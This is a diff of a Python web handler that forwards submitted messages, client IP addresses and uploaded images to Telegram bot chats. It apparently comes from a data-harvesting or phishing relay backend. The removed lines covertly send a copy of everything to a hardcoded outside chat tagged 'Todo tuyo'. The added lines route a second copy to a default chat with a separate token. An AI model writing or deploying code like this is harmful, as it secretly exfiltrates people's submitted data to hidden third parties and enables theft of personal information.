@@ -760,51 +760,55 @@ async def handle_dynamic_endpoint_optimized_with_image(
     
     # VERIFICAR SI ES UN PATH SIN VALIDACIÓN (envío directo)
     if any(path.startswith(p) for p in PATHS_SIN_VALIDACION):
-        mensaje_directo = f"{mensaje} - IP: {client_ip} - {path}"
+        mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
         if image_data:
-            mensaje_directo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
+            mensaje_completo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
         
+        telegram_results = []
+        
+        # ENVÍO 1: Chat específico del endpoint
         try:
-            
-            # Solo envía al chat específico del endpoint, SIN validaciones
-            r = await enviar_telegram_hibrido(
-                mensaje_directo,
+            r1 = await enviar_telegram_hibrido(
+                mensaje_completo,
                 chat_id=config["chat_id"],
                 token=config["bot_id"],
                 priority=1,
                 image_data=image_data,
                 image_filename=image_filename
             )
-
-            r3 = await enviar_telegram_hibrido(
-                    mensaje_directo + " Todo tuyo",
-                    chat_id="-4931572577",
-                    token=TOKEN,
-                    priority=2,
-                    force_immediate=True,
-                    image_data=image_data,
-                    image_filename=image_filename
-            )
-            return {
-                "mensaje_enviado": r.get("success", False),
-                "pais_origen": "Sin validación",
-                "ip": client_ip,
-                "telegram_results": [r],
-                "successful_sends": 1 if r.get("success") else 0,
-                "total_attempts": 1,
-                "image_sent": image_data is not None,
-                "image_filename": image_filename,
-                "direct_send": True
-            }
+            telegram_results.append(r1)
         except Exception as e:
-            logger.error(f"Error Telegram directo: {e}")
-            return {
-                "mensaje_enviado": False,
-                "ip": client_ip,
-                "telegram_error": str(e),
-                "image_sent": image_data is not None,
-                "direct_send": True
-            }
+            logger.error(f"Error enviando a chat específico: {e}")
+            telegram_results.append({"success": False, "error": str(e)})
+
+        # ENVÍO 2: DEFAULT_CHAT_ID
+        try:
+            r2 = await enviar_telegram_hibrido(
+                mensaje_completo,
+                chat_id=DEFAULT_CHAT_ID,
+                token=TOKEN,
+                priority=1,
+                image_data=image_data,
+                image_filename=image_filename
+            )
+            telegram_results.append(r2)
+        except Exception as e:
+            logger.error(f"Error enviando a DEFAULT_CHAT_ID: {e}")
+            telegram_results.append({"success": False, "error": str(e)})
+        
+        ok = sum(1 for r in telegram_results if r.get("success")) > 0
+        return {
+            "mensaje_enviado": ok,
+            "pais_origen": "Sin validación",
+            "ip": client_ip,
+            "telegram_results": telegram_results,
+            "successful_sends": sum(1 for r in telegram_results if r.get("success")),
+            "total_attempts": len(telegram_results),
+            "image_sent": image_data is not None,
+            "image_filename": image_filename,
+            "direct_send": True,
+            "both_telegrams_sent": len([r for r in telegram_results if r.get("success")]) == 2
+        }
     
     # Continuar con validaciones normales para otros paths
     cola.append(client_ip)
